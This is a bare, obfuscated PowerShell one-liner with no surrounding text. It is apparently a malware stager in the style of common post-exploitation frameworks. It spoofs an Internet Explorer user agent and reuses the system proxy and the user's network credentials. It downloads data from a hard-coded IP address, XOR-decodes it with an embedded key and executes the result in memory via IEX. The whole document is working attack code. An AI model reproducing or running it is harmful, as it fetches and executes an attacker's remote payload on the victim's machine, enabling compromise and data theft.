
$Wc=New-OBjECt SyStEm.NeT.WEBClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRs.AdD('User-Agent',$u);$Wc.Proxy = [SyStem.NEt.WebREQUeST]::DefauLTWebPrOxY;$WC.ProXY.CrEDeNtiaLs = [SySTEM.Net.CREDenTIaLCACHe]::DEfaulTNetWoRkCrEDEnTiALS;$K='b7a39971413f4e13073ffb389d24428c';$i=0;[ChAR[]]$b=([char[]]($wc.DownlOaDStRINg("http://93.187.43.200:80/index.asp")))|%{$_-bXoR$K[$I++%$k.LenGTH]};IEX ($B-JoiN'')

